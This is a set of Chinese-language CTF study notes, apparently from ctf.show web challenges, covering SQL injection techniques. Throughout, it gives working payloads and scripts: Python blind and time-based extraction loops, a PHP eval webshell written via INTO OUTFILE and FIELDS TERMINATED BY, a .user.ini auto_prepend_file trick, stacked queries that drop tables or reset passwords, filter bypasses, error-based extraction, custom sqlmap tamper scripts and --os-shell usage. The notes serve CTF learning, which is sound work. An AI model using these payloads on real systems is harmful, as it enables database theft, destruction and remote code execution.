r.json()的结果为：<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/29405061/1667271110878-a1471182-3f09-4180-a714-62c80cd4c4b6.png#averageHue=%23292827&clientId=ufbe9e086-7f14-4&from=paste&height=24&id=u0feda798&originHeight=48&originWidth=1073&originalType=binary&ratio=1&rotation=0&showTitle=false&size=10180&status=done&style=none&taskId=uf927bdfe-04a2-4483-a3ff-60db9eeee39&title=&width=536.5)
#### 常用函数

- ASCII()：返回[字符串](https://so.csdn.net/so/search?q=%E5%AD%97%E7%AC%A6%E4%B8%B2&spm=1001.2101.3001.7020)第一个字符的 [ASCII](http://www.nowamagic.net/academy/tag/ASCII) 值，通常和substr一起用
- ord()：返回[字符串](https://so.csdn.net/so/search?q=%E5%AD%97%E7%AC%A6%E4%B8%B2&spm=1001.2101.3001.7020)第一个字符的 [ASCII](http://www.nowamagic.net/academy/tag/ASCII) 值
- char()：返回字符的ASCII码值
- left('str',2)：返回'st'
#### 变形1：在文件中获取flag(web189)
```sql
locate('str','abstr')//返回结果为3
```

- 测试得到两种返回值，用二分法查找位置
- 用32-127的ASCII码判断每个字符

### 时间盲注(页面无回显)

- 先首页抓包，看看有没有什么异常的包

and if(条件,1,0)

```python
import requests

url = "http://7eac161c-e06e-4d48-baa5-f11edaee7d38.chall.ctf.show/api/v5.php?id=1' and "

result = ''
i = 0

while True:
    i = i + 1
    head = 32
    tail = 127

    while head < tail:
        mid = (head + tail) >> 1
        payload = f'1=if(ascii(substr((select  password from ctfshow_user5 limit 24,1),{i},1))>{mid},sleep(2),0) -- -'
        try:
            r = requests.get(url + payload, timeout=0.5)
            tail = mid
        except Exception as e:
            head = mid + 1

    if head != 32:
        result += chr(head)
    else:
        break
    print(result)
```
#### 时间延迟函数
##### sleep
##### benchmark
```sql
select benchmark(3480500,sha(1)) //对1进行sha操作，重复执行3480500次
```
##### 笛卡尔积
```sql
SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.columns C, information_schema.columns D
//如果上面的延迟太高，可以换成
SELECT count(*) FROM information_schema.columns A, information_schema.columns B,(SELECT count(*) FROM information_schema.columns A limit 1,10) C
```

- 笛卡尔积的结果，第一行会返回A*B*C的结果

**注意点**
```python
r = requests.post(url, data=data, timeout=3)
```

- 这里设置的timeout是连接超时和读取超时共用的
- 连接超时一般设为比 3 的倍数略大的一个数值，因为 TCP 数据包重传窗口的默认大小是 3
- 如果设置小于3，可能读不出数据

#### get和post
```python
#def get(url, params=None, **kwargs) get函数的定义
url = "http://7eac161c-e06e-4d48-baa5-f11edaee7d38.chall.ctf.show/api/v5.php?"
url2 = "http://7eac161c-e06e-4d48-baa5-f11edaee7d38.chall.ctf.show/api/v5.php"
payload = "id = 1 xxxxx"
payload2={'id' : '1 xxxxx'}

requests.get(url + payload, timeout=1) //相当于url和payload放一起，注意问号的位置
requests.get(url2, params=payload2, timeout=1)//相当于用post的形式提交
```

### into outfile

```
union select 1,password from ctfshow_user5 into outfile '/var/www/html/1.txt'--+
```

```php
union select "<?php eval($_POST[1]);?>" into outfile "/var/www/html/a.php"%23
```

- 如果不能执行，尝试用url编码
#### 
### md5($string,true)(web 187)
```php
echo md5("ctf", false) //会返回32位的md5值
echo md5("ctf", true)//将以 16 字符长度的原始二进制格式返回
```
#### md5("ctf", true)存在注入
![image.png](https://cdn.nlark.com/yuque/0/2022/png/29405061/1667141388146-2efcc66a-7d03-4dd5-80c1-08616feea378.png#averageHue=%23f3f3f3&clientId=ucb3da729-db9a-4&from=paste&height=375&id=ube3a9fb6&originHeight=750&originWidth=1773&originalType=binary&ratio=1&rotation=0&showTitle=false&size=63828&status=done&style=none&taskId=u716cd187-5ce1-42de-b215-86bc7f69e95&title=&width=886.5)
```php
echo md5('ffifdyop',true) //返回值为'or'6�]��!r,��b
```

- 将password设置为该值，即可成功绕过
#### mysql弱类型(web 188)
![image.png](https://cdn.nlark.com/yuque/0/2022/png/29405061/1667202140453-3c7ba353-ea55-4107-8ac5-8bc323eddca7.png#averageHue=%23f2f2f2&clientId=u31d3c051-600c-4&from=paste&height=513&id=uc8539687&originHeight=1025&originWidth=1504&originalType=binary&ratio=1&rotation=0&showTitle=false&size=90079&status=done&style=none&taskId=u3cd2b5bd-6a27-4022-af44-277eb440350&title=&width=752)<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/29405061/1667202303252-f3d1f173-0e30-40a8-aa94-b43acc0c3771.png#averageHue=%23efeeee&clientId=u31d3c051-600c-4&from=paste&height=134&id=u748a61bd&originHeight=268&originWidth=550&originalType=binary&ratio=1&rotation=0&showTitle=false&size=28155&status=done&style=none&taskId=ubd00a6e3-63d0-4fa7-a82b-91610e92ae4&title=&width=275)
```sql
select pass from ctfshow_user where username = 0 //当没有单引号时，0会和字符匹配，查询出id从1-5
select pass from ctfshow_user where username = 4 //查询出id为6的数据 
```
### 堆叠注入

-  把一堆语句放在一起(可以使用在Mysql命令行中使用的语句)<br />**mysql命令中的是 show databases; 而Mysql函数是 database()** 
```
http://61.147.171.105:64583/?inject=1' ;show databases; %23
```
 
#### 显示所有表

```
http://61.147.171.105:64583/?inject=1' ;show tables; %23
```

#### 显示所有列

-  当表名是字符串时，操作要加反引号` 
```
http://61.147.171.105:64583/?inject=1';show columns from `1919810931114514`;%23
```

#### 更新密码
```sql
;update`ctfshow_user`set`pass`='123';
```
#### handler查询

- select如果被过滤了，可以用这个查询

#### select(1) web 196
![](https://cdn.nlark.com/yuque/0/2022/png/29080821/1667304239455-882dd8d7-6ae7-4f40-96a6-565029701d96.png?x-oss-process=image%2Fresize%2Cw_1500%2Climit_0#averageHue=%23f1f0f0&from=url&id=xnwrR&originHeight=889&originWidth=1500&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

- 将 1;select(1) 放到 sql 语句中会变成这样：
```
select password from user where username = 1;select 1;
```

- 这个是啥也不输出的。
- 思考之后，发现其实可以这样理解，把上述sql语句理解成如下：
```
select password from user where username = 1 union select 1;
```

- 这样的话，sql语句返回1，然后直接和输入的password作比较，就可以理解了。

![](https://cdn.nlark.com/yuque/0/2022/png/29080821/1667304495290-966f11d4-45db-4e85-a93f-6dfb4deb7d88.png#averageHue=%23efedec&from=url&id=rMTB0&originHeight=636&originWidth=1511&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

- 只要红框1与红框2中的东西相同，就可以输出flag。事实证明的确是这样的。

**非常好用的payload**
```sql
用户名：0;show tables;
密码： ctfshow_user
```
#### drop table
![image.png](https://cdn.nlark.com/yuque/0/2022/png/29405061/1667390341382-ddc7291c-802d-49c4-ad9a-68185f3bc1a7.png#averageHue=%23f6f6f6&clientId=u4ab71d4f-06cb-4&from=paste&height=616&id=uf797846f&originHeight=1232&originWidth=2088&originalType=binary&ratio=1&rotation=0&showTitle=false&size=101937&status=done&style=none&taskId=u007f16ff-0686-445a-862f-f7b6059045f&title=&width=1044)<br />设置username为：
```php
0;drop table ctfshow_user;create table ctfshow_user(`username` varchar(100),`pass` varchar(100));
insert ctfshow_user(`username`,`pass`) value(1,2)
```
#### 交换用户名、密码

- 单引号过滤了，用反引号代替
```sql
alter table ctfshow_user change `pass` `pass2` varchar(100);
alter table ctfshow_user change `pass2` `username` varchar(100);
alter table ctfshow_user change `username` `pass` varchar(100);
```
##### text替换varchar

- 如果题目对 ()进行了过滤，那么将上面的varchar 类型改为text
```sql
alter table ctfshow_user change `pass` `pass2` text;
alter table ctfshow_user change `pass2` `username` text;
alter table ctfshow_user change `username` `pass` text;
```

### 图片注入
[https://zhuanlan.zhihu.com/p/471136978](https://zhuanlan.zhihu.com/p/471136978)

![image.png](https://cdn.nlark.com/yuque/0/2022/png/29405061/1668001707243-03128d2f-51c0-4a2c-8468-4c629582797c.png#averageHue=%23f8f8f7&clientId=u28f216fd-6910-4&from=paste&height=226&id=u9772cac5&originHeight=452&originWidth=1411&originalType=binary&ratio=1&rotation=0&showTitle=false&size=50148&status=done&style=none&taskId=u62b04f79-fd92-4c79-8597-c4626462a8b&title=&width=705.5)

- 这里构造一个payload.bin的文件上传

![image.png](https://cdn.nlark.com/yuque/0/2022/png/29405061/1668001840409-dd1e9c50-9937-4166-9c8c-d88937386212.png#averageHue=%23fcfcfc&clientId=u28f216fd-6910-4&from=paste&height=248&id=BJxNO&originHeight=496&originWidth=1869&originalType=binary&ratio=1&rotation=0&showTitle=false&size=46568&status=done&style=none&taskId=ue2558234-8a11-4215-9b6e-5cfdd35e421&title=&width=934.5)

- 根据返回信息，猜测filetype可能存在注入点

![9df0b2e22e10825b86652215c85d292.png](https://cdn.nlark.com/yuque/0/2022/png/29405061/1668001899790-1f154485-316d-4957-a5cb-33d9ea29e824.png#averageHue=%23242221&clientId=u28f216fd-6910-4&from=paste&height=329&id=u4c4843a4&originHeight=657&originWidth=1842&originalType=binary&ratio=1&rotation=0&showTitle=false&size=87391&status=done&style=none&taskId=u21e5e3c9-66b8-49ef-9b71-c268edc82a2&title=&width=921)

- 源代码中，这里通过file方法会获取文件的filetype并存到数据库中
- 因此构造sql语句，可以闭合下面的insert语句，进行堆叠注入

![29d7f5eea86063a7aa55a579ff0e20c.png](https://cdn.nlark.com/yuque/0/2022/png/29405061/1668001951695-b0bd80a3-6866-4088-a37c-f06638c3fe79.png#averageHue=%23352321&clientId=u28f216fd-6910-4&from=paste&height=70&id=u6841a039&originHeight=140&originWidth=2809&originalType=binary&ratio=1&rotation=0&showTitle=false&size=35346&status=done&style=none&taskId=ub249bd91-481e-43eb-9835-bfa2ce6e67b&title=&width=1404.5)
### 
## <br />


### 
### 
### 
### 预处理语句
[https://blog.csdn.net/solitudi/article/details/107823398?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522160652999219721940215459%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&request_id=160652999219721940215459&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_v2~rank_blog_default-1-107823398.pc_v2_rank_blog_default&utm_term=%E5%BC%BA%E7%BD%91%E6%9D%AF&spm=1018.2118.3001.4450](https://blog.csdn.net/solitudi/article/details/107823398?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522160652999219721940215459%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&request_id=160652999219721940215459&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_v2~rank_blog_default-1-107823398.pc_v2_rank_blog_default&utm_term=%E5%BC%BA%E7%BD%91%E6%9D%AF&spm=1018.2118.3001.4450)

#### 预处理语句
```sql
SET @tn = 'hahaha';  //存储表名
SET @sql = concat('select * from ', @tn);  //存储SQL语句-->这里的sql语句经过测试得是select，不能是show开头
PREPARE name from @sql;   //预定义SQL语句
EXECUTE name;  //执行预定义SQL语句
(DEALLOCATE || DROP) PREPARE sqla;  //删除预定义SQL语句
```
#### concat 绕过一切
方法1：按照上面的标准写法，char(115,101,108,101,99,116) = select
```sql
1';SET @sqli=concat(char(115,101,108,101,99,116),'* from `1919810931114514`');
PREPARE st from @sqli;
EXECUTE st;#
```
方法2：
```sql
1';PREPARE st from concat('s','elect', ' * from `1919810931114514` ');EXECUTE st;#

//也可以直接

1';PREPARE st from select * from user;EXECUTE st;#
```
#### 16进制

```sql
1';PREPARE st from concat('s','elect', ' * from `1919810931114514` ');EXECUTE st;#

//等价于下面的语句

1';PREPARE st from 0x636f6e636174282773272c27656c656374272c2027202a2066726f6d20603139313938313039333131313435313460202729;
EXECUTE st;#
```

- 记得要对编码的结果前加0x
### 
### 
### 
### 
### 
### 
### sqlmap
```shell
//如果不知道id，随便写一个
sqlmap -u "url/?id=xx" --current-db
//假设数据库名是cyber
sqlmap -u "url/?id=xx" -D cyder --tables
//假设表明是cyber
sqlmap -u "url/?id=xx" -D cyder -T cyber
sqlmap -u "url/?id=xx" -T cyber --columns
//假设有一列名是pw,要给列名加双引号，--dump显示具体信息
sqlmap -u "url/?id=xx" -C "pw" --dump

--batch                             测试过程中， 执行所有默认配置
```
#### --referer和--user-agent
```shell
--user-agent 指定agent
--referer 绕过referer检查
```
#### --data
![image.png](https://cdn.nlark.com/yuque/0/2022/png/29405061/1667528516836-c750262e-8288-48ba-8176-4be6106cd230.png#averageHue=%23f1f1f1&clientId=u263e212a-c22a-4&from=paste&height=230&id=u1d4e59c9&originHeight=460&originWidth=1005&originalType=binary&ratio=1&rotation=0&showTitle=false&size=27195&status=done&style=none&taskId=u2581948d-bb42-421f-bf26-045c6f5c461&title=&width=502.5)<br />**注意点：url通过抓包获取，如果抓包是get传参，改成用post的话，那api后要有/。**
```shell
sqlmap -u "xxx/api/" --data=数据 通过POST发送数据字符串，例如: --data="id=1"
```
#### --method
**注意点**

- put可能是大写PUT
- 要加上–headers="Content-Type: text/plain"
- 如果/api/没扫出来，那么尝试/api/index.php
-  url后面是/index.php时 sqlmap会附加测试参数，是/时sqlmap认为是目录，不附加测试参数
```shell
sqlmap -u "xxx/api/" --method=PUT --data="id=1" --referer=ctf.show --headers="Content-Type: text/plain" --dbms=mysql -D ctfshow_web -T ctfshow_user -C pass --dump
```
##### http put vs post
[https://cloud.tencent.com/developer/news/39873](https://cloud.tencent.com/developer/news/39873)

- 使用PUT时，必须明确知道要操作的对象，如果对象不存在，创建对象；如果对象存在，则**全部替换目标对象**。
- put是idempotent（幂等的，多次提交，结果相同）
- POST既可以创建对象，也可以修改对象。但用POST创建对象时，之前并不知道要操作的对象，由HTTP服务器为新创建的对象生成一个唯一的URI；
- 使用POST修改已存在的对象时，一般只是**修改目标对象的部分内容**
#### --cookie
![image.png](https://cdn.nlark.com/yuque/0/2022/png/29405061/1667531803618-3cee2be8-a6c2-4e8f-9d0c-d2f1f0aa7576.png#averageHue=%23e7d8c5&clientId=u263e212a-c22a-4&from=paste&height=511&id=u0edcf33c&originHeight=1022&originWidth=2592&originalType=binary&ratio=1&rotation=0&showTitle=false&size=218471&status=done&style=none&taskId=u3d343c57-6e8e-4e35-99cc-a865d12e866&title=&width=1296)
```shell
sqlmap -u "xxx" --cookie="PHPSESSID=f4jg1nq14qk0b2lt4g7be6c490; ctfshow=fcfcd45b23c5d083c62dee06dd52f859"
```
#### 鉴权
![da07003d5ccb0da9cf3762b31e9137d.jpg](https://cdn.nlark.com/yuque/0/2022/jpeg/29405061/1667533394022-4b912c2d-5ed8-468e-819a-17e948ffdea7.jpeg#averageHue=%23f6f5f5&clientId=u263e212a-c22a-4&from=paste&height=237&id=ueab8eff2&originHeight=473&originWidth=1519&originalType=binary&ratio=1&rotation=0&showTitle=false&size=75805&status=done&style=none&taskId=uf9985609-6f45-4a08-827a-51a8b9cf63a&title=&width=759.5)<br />![c541ae9ec07317a1941ad2a3e9cd903.jpg](https://cdn.nlark.com/yuque/0/2022/jpeg/29405061/1667533400543-47bc8a35-ae15-4629-a139-84a565308874.jpeg#averageHue=%23f6f6f6&clientId=u263e212a-c22a-4&from=paste&height=241&id=uff5dadd7&originHeight=482&originWidth=1625&originalType=binary&ratio=1&rotation=0&showTitle=false&size=73312&status=done&style=none&taskId=u52639826-f34c-40c0-b931-802b380bbf5&title=&width=812.5)

- burp抓包可知，在访问目标网址前，会先访问gettoken.php
```shell
--safe-url 设置在测试目标地址前访问的安全链接
 --safe-freq 设置两次注入测试前访问安全链接的次数

sqlmap.py -u "xxx" --safe-url="xxxx/getToken.php" --safe-freq=1
```
#### 闭合sql
![image.png](https://cdn.nlark.com/yuque/0/2022/png/29405061/1667547922387-d4a4ee72-5d95-4998-85e2-7ad0349eb93e.png#averageHue=%23f0f0f0&clientId=u9b62095b-5164-4&from=paste&height=89&id=u0f6b7b0e&originHeight=177&originWidth=1483&originalType=binary&ratio=1&rotation=0&showTitle=false&size=19214&status=done&style=none&taskId=u7155534f-0738-454c-bea8-9c53d294e75&title=&width=741.5)

- 这里需要闭合前面的单引号和括号
```shell
sqlmap -u http://128a0fb2-4799-4a88-82e6-02ee85211fd1.challenge.ctf.show/api/index.php --method=PUT --data="id=1" --referer=ctf.show  --headers="Content-Type: text/plain" --cookie="PHPSESSID=hbbuo92v17defcf4d01d198kol" --safe-url=http://128a0fb2-4799-4a88-82e6-02ee85211fd1.challenge.ctf.show/api/getToken.php --safe-freq=1 --user-agent="sqlmap" --prefix="')" --suffix="#" --current-db -D "ctfshow_web" -T "ctfshow_flaxc" -C "flagv" --dump
//--prefix="')" 添加前缀 
//--suffix="#" 添加后缀
```
#### --tamper
指定攻击载荷的篡改脚本<br />[tamper介绍](https://y4er.com/posts/sqlmap-tamper/#%E7%AE%80%E5%8D%95%E4%BB%8B%E7%BB%8Dtamper)<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/29405061/1667549388191-53a2efe6-9135-4cde-8bca-fe31de58be9e.png#averageHue=%23f5f4f4&clientId=u9b62095b-5164-4&from=paste&height=524&id=uc01b6c4a&originHeight=1048&originWidth=1740&originalType=binary&ratio=1&rotation=0&showTitle=false&size=77097&status=done&style=none&taskId=uc6928128-7d11-4289-a433-561cf4d8913&title=&width=870)

- 这里对空格进行了过滤，因此可以指定一个脚本，如space2comment，将空格转为注释
- 可以在sqlmap的tamper目录下查看space2comment的源码，也可以将自己写的绕过放到该目录下
```shell
--tamper = "space2comment"
```
##### 过滤select
![image.png](https://cdn.nlark.com/yuque/0/2022/png/29405061/1667550743488-35a9e1ef-669e-4825-a070-e17a447afd43.png#averageHue=%23f4f3f3&clientId=u9b62095b-5164-4&from=paste&height=307&id=u51453900&originHeight=613&originWidth=1663&originalType=binary&ratio=1&rotation=0&showTitle=false&size=50869&status=done&style=none&taskId=u026bb624-42ad-41c4-9cc2-7f083b1085a&title=&width=831.5)

- 这里过滤了空格，且替换了select，正常需要双写绕过
```shell
-v 6//查看详细的测试信息，从1-6
```

- 查看测试信息，发现没有用小写的select，因此也就不用绕过，直接--tamper=space2comment就可以查出结果

![image.png](https://cdn.nlark.com/yuque/0/2022/png/29405061/1667550919048-09008d29-3440-41f0-9ff9-dfc5b7e34f86.png#averageHue=%232f323c&clientId=u9b62095b-5164-4&from=paste&height=526&id=u40417816&originHeight=1051&originWidth=2384&originalType=binary&ratio=1&rotation=0&showTitle=false&size=272259&status=done&style=none&taskId=u0495a0f2-a854-4099-9ef8-56f030bd8d9&title=&width=1192)
##### 过滤=,* ，空格

- 仍然用前面学习的方法绕过，只不过改一下放到脚本中
- 用0a绕过空格，用like绕过=，用1绕过*(主要针对count(*)这种情况)
```python
#!/usr/bin/env python
from lib.core.compat import xrange
from lib.core.enums import PRIORITY

__priority__ = PRIORITY.LOW

def dependencies():
    pass

def tamper(payload, **kwargs):
    retVal = payload

    if payload:
        retVal = ""
        quote, doublequote, firstspace = False, False, False

        for i in range(len(payload)):
            if not firstspace:
                if payload[i].isspace():
                    firstspace = True
                    retVal += chr(0x0a)
                    continue

            elif payload[i] == '\'':
                quote = not quote

            elif payload[i] == '"':
                doublequote = not doublequote
            
            elif payload[i] == "*":
                retVal += chr(0x31)
                continue

            elif payload[i] == "=":
                retVal += chr(0x0a)+'like'+chr(0x0a)
                continue

            elif payload[i] == " " and not doublequote and not quote:
                retVal += chr(0x0a)
                continue

            retVal += payload[i]

    return retVal

```
也可以直接把上述代码简化
```python
def tamper(payload, **kwargs):
    retVal =payload
    if payload:
        retval = retVal.replace ("COUNT(* ) ", "COUNT ( id) ")
        retval = retval.replace (" ", chr(0x0a))
        retVal = retVal.replace ("=", chr (0x0a)+"like" + chr(0x0a))
    return retval
```
#### --os-shell 

- 直接在上面的基础上，不再用--current-db一步一步获取信息，直接--os-shell，getshell

### limit注入(mysql)
[https://www.leavesongs.com/PENETRATION/sql-injections-in-mysql-limit-clause.html](https://www.leavesongs.com/PENETRATION/sql-injections-in-mysql-limit-clause.html)

- 在LIMIT后面可以跟两个函数，PROCEDURE 和 INTO，into需要写权限，一般不常见，但是PROCEDURE在msyql5.7以后已经弃用，8.0直接删除

[https://www.docs4dev.com/docs/zh/mysql/5.7/reference/xml-functions.html#function_extractvalue](https://www.docs4dev.com/docs/zh/mysql/5.7/reference/xml-functions.html#function_extractvalue)

#### 报错注入
<br />

- SELECT ExtractValue('<a><b><b/></a>', '/a/b'); 就是寻找前一段xml文档内容中的a节点下的b节点，这里如果Xpath格式语法书写错误的话，就会报错
```sql
SELECT ExtractValue('<a><b><b/></a>', '~')
```

#### procedure analyse

- 用于优化表结构
```sql
procedure analyse(1,1)
```
#### payload
```sql
URL/api/?page=1&limit=1 procedure analyse(extractvalue(rand(),concat(0x3a,database())),1)
```
#### 
### group by
```sql
select * from user group by 1
```

- group by 1的意思就是根据查询结果的第一列的名称返回，假设表的列依次是id, username, password，那么等同于group by id

#### 注入方法

- 时间盲注，直接在后面构造语句爆破信息
```sql
select * from user group by (if(2 > 1, sleep(1), 1))
```

### 查看存储过程
[https://blog.csdn.net/qq_41573234/article/details/80411079](https://blog.csdn.net/qq_41573234/article/details/80411079)

- 如果找遍了mysql的字段，都找不到flag，那就查看存储过程
```sql
SELECT * FROM information_schema.Routines
```

- information_schema  数据库中的  Routines  表中，存储了所有存储过程和函数的定义

### Update注入
#### 特点
[https://www.cnblogs.com/duanxz/p/5099030.html](https://www.cnblogs.com/duanxz/p/5099030.html)

- 不能先select出同一表中的某些值，再update这个表(在同一语句中)
```sql
update user set username=(select username from user where username = 'a') where username = 'admin';
```
![image.png](https://cdn.nlark.com/yuque/0/2022/png/29405061/1667917082676-c061816c-1cd2-41af-886a-dc0bb783e4d2.png#averageHue=%23febfca&clientId=ud0e0dd54-715e-4&from=paste&height=197&id=u5ec08c7c&originHeight=393&originWidth=1142&originalType=binary&ratio=1&rotation=0&showTitle=false&size=33691&status=done&style=none&taskId=u40eacd15-0903-4e6d-99e3-6bd39b887c6&title=&width=571)
#### payload

#### 0x01：

![image.png](https://cdn.nlark.com/yuque/0/2022/png/29405061/1667917137648-bdfa82fd-a7f1-4648-9343-bb3eed368313.png#averageHue=%23f6f6f5&clientId=ud0e0dd54-715e-4&from=paste&height=280&id=ub22fcc55&originHeight=560&originWidth=1647&originalType=binary&ratio=1&rotation=0&showTitle=false&size=28044&status=done&style=none&taskId=u2d598940-e9d2-41f7-ac62-f4c6a82e31b&title=&width=823.5)
```sql
pass = 1}',username = (select group_concat(table_name) from 
information_schema.tables where table_schema=database()) where 1=1# 
&username = ctfshow
```

- 这里注意要写where 1=1 ，符合update的语法，找到要更新的值
- 要提交username参数

#### 0x02：子查询

```sql
pass = 1}',username = (select a from (select group_concat(table_name)a from 
information_schema.tables where table_schema=database())b) where 1=1# 
&username = ctfshow
```

- 给table_name一个别名a
- 将`select group_concat(table_name)a from information_schema.tables where table_schema=database()`的结果作为b，b是a的集合
- 从b中查询a

#### 0x03 \

- \闭合，详见神奇闭合

### Insert注入
```sql
 $sql = "insert into ctfshow_user(username,pass) value('{$username}','{$password}')";

```

payload:

```sql
username=1,(select xxxx)');#&password=1 
```
#### sql语句还可以是这样的
```sql
 sql = "insert into comment
            set category = '$category',
                content = '$content',
                bo_id = '$bo_id'";
```
payload
```sql
category=1',content=(select database()),/*&content=*/#
```
#### web 240
![image.png](https://cdn.nlark.com/yuque/0/2022/png/29405061/1668324721593-70f2748c-6e0b-4489-901a-d6d288a41fba.png#averageHue=%23f6f6f6&clientId=uf1083ba2-7248-4&from=paste&height=259&id=u73539723&originHeight=518&originWidth=1670&originalType=binary&ratio=1&rotation=0&showTitle=false&size=34528&status=done&style=none&taskId=ub338bac3-7559-41cb-836e-be5ae1e88c6&title=&width=835)

- 这个题过滤的东西太多，只能根据提示猜，

![image.png](https://cdn.nlark.com/yuque/0/2022/png/29405061/1668324758627-5e7f5300-9734-4b96-b51a-e143adf14f5d.png#averageHue=%23fefefe&clientId=uf1083ba2-7248-4&from=paste&height=92&id=u0eb81d81&originHeight=183&originWidth=1124&originalType=binary&ratio=1&rotation=0&showTitle=false&size=23921&status=done&style=none&taskId=ud7693272-35ae-4f19-96a5-cee480c7af6&title=&width=562)

- 脚本爆破：
```python
import random
import requests

url = "http://b82a605d-0bcc-4005-9b7b-9562403f5848.challenge.ctf.show"
url_insert = url + "/api/insert.php"
url_flag = url + "/api/?page=1&limit=1000"


# 看命函数
def generate_random_str():
    sttr = 'ab'
    str_list = [random.choice(sttr) for i in range(5)]
    random_str = ''.join(str_list)
    return random_str


while 1:
    data = {
        'username': f"1',(select(flag)from(flag{generate_random_str()})))#",
        'password': ""
    }
    r = requests.post(url_insert, data=data)
    r2 = requests.get(url_flag)
    if "ctfshow" in r2.text:
        print(r2.json()['data'])
        exit()
        for i in r2.json()['data']:
            if  "ctfshow" in i['pass']:
                print(i['pass'])
                break
        break
```
### delete 注入

- or时间盲注
### file注入
![image.png](https://cdn.nlark.com/yuque/0/2022/png/29405061/1668347102203-b86ae7e5-18e8-452f-8433-ff641c0dff9f.png#averageHue=%23f7f6f6&clientId=ue81eccc3-ef11-4&from=paste&height=280&id=udba6c2f2&originHeight=560&originWidth=1692&originalType=binary&ratio=1&rotation=0&showTitle=false&size=28503&status=done&style=none&taskId=uee1a8342-7825-48df-82d9-18756cda4ce&title=&width=846)

- 查询官方文档可知
```sql
SELECT ... INTO OUTFILE 'file_name'
        [CHARACTER SET charset_name]
        [export_options]
 
export_options:
    [{FIELDS | COLUMNS}
        [TERMINATED BY 'string']//分隔符
        [[OPTIONALLY] ENCLOSED BY 'char']
        [ESCAPED BY 'char']
    ]
    [LINES
        [STARTING BY 'string']
        [TERMINATED BY 'string']
    ]

/***********************************************************/

“OPTION”参数为可选参数选项，其可能的取值有：
 
`FIELDS TERMINATED BY '字符串'`：设置字符串为字段之间的分隔符，可以为单个或多个字符。默认值是“\t”。
 
`FIELDS ENCLOSED BY '字符'`：设置字符来括住字段的值，只能为单个字符。默认情况下不使用任何符号。
 
`FIELDS OPTIONALLY ENCLOSED BY '字符'`：设置字符来括住CHAR、VARCHAR和TEXT等字符型字段。默认情况下不使用任何符号。
 
`FIELDS ESCAPED BY '字符'`：设置转义字符，只能为单个字符。默认值为“\”。
 
`LINES STARTING BY '字符串'`：设置每行数据开头的字符，可以为单个或多个字符。默认情况下不使用任何字符。
 
`LINES TERMINATED BY '字符串'`：设置每行数据结尾的字符，可以为单个或多个字符。默认值是“\n”。
```
重要的思想：在php页面中导入一句话木马，即可getshell

- 因此，可以设置FIELDS TERMINATED BY 一句话木马
```sql
filename=1.php' FIELDS TERMINATED BY '<?php eval($_POST[1]);?>'
```

#### 过滤php
![image.png](https://cdn.nlark.com/yuque/0/2022/png/29405061/1668350978842-33b128c4-6ba5-4981-a671-0cfb8a7bbd28.png#averageHue=%23f6f6f5&clientId=ue81eccc3-ef11-4&from=paste&height=221&id=u8a3b30a7&originHeight=441&originWidth=1627&originalType=binary&ratio=1&rotation=0&showTitle=false&size=24938&status=done&style=none&taskId=u6cc61ebb-7d6e-41af-86f9-d74023fa69f&title=&width=813.5)

- 这里先创建.user.ini，.user.ini文件中，；表示注释，且要让auto_prepend_file=1.jpg单独一行
```sql
filename=.user.ini' lines starting by ';' terminated by 0x0a6175746f5f70726570656e645f66696c653d312e6a70670a;#
//也就是如下语句，只不过在`auto_prepend_file=1.jpg`前后加了%0a用于换行，保证注入的内容单独在一行
filename=.user.ini' lines starting by ';' terminated by "auto_prepend_file=1.jpg"#
```

- 注意是在lines的结尾加了auto_prend_file，所以要在字符串前后都要加0a

注意点：字符串可用16进制表示

- 创建1.jpg
### 报错注入
#### updatexml

- updatexml(xml_doument,XPath_string,new_value)
- xml文档中查找字符位置是用 /xxx/xxx/xxx/…这种格式，也就是使用路径去定义一个元素
- 只需要构造错误的XPath_string，concat的第一个参数可以换成0x7e(~)等
```sql
//查表名
/?id=' or updatexml(1,concat(1,(select group_concat(table_name) from information_schema.tables where table_schema=database())),1) -- A
//查列名
/?id=' or updatexml(1,concat(1,(select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flag')),1) -- A
//查数据(因为报错信息长度有限，所以要分段读取)
/?id=' or updatexml(1,(select right(flag,30) from ctfshow_flag limit 0,1),1) -- A
```
#### extractvalue()
```sql
//查表名
/?id=1' or extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e)); -- a
//查列名
/?id=1' or extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flagsa'),0x7e)); -- a
//查数据(因为报错信息长度有限，所以要分段读取)
/?id=1' or extractvalue(1,concat(0x7e,(select right(flag1,30) from ctfshow_flagsa),0x7e)); -- a
```

- extractvalue()能查询字符串的**最大长度为32**，就是说如果我们想要的结果超过32，就需要用substring()函数截取

#### floor()
[https://www.cnblogs.com/wzy-ustc/p/14217750.html](https://www.cnblogs.com/wzy-ustc/p/14217750.html)

- floor()返回不大于x的最大整数值
```sql
//查表名
/?id=1' union select 1,count(*),concat((select table_name from information_schema.tables where table_schema=database() limit 1,1),0x7e,floor(rand()*2))a from information_schema.tables group by a-- A
//查列名
/?id=1' union select 1,count(*),concat((select column_name from information_schema.columns where table_name='ctfshow_flags' limit 1,1),0x7e,floor(rand()*2))a from information_schema.tables group by a-- A
//查数据
/?id=1' union select 1,count(*),concat((select flag2 from ctfshow_flags),0x7e,floor(rand()*2))a from information_schema.tables group by a-- A
```

#### Ceil或round

- 使用ceil()(向上取整)代替floor()。当然也可以使用round()：
- ROUND(X) – 表示将值 X 四舍五入为整数，无小数位
- ROUND(X,D) – 表示将值 X 四舍五入为小数点后 D 位的数值，D为小数点后小数位数。若要保留 X 值小数点左边的 D 位，可将 D 设为负值

#### 时间盲注-yyds

### udf提权
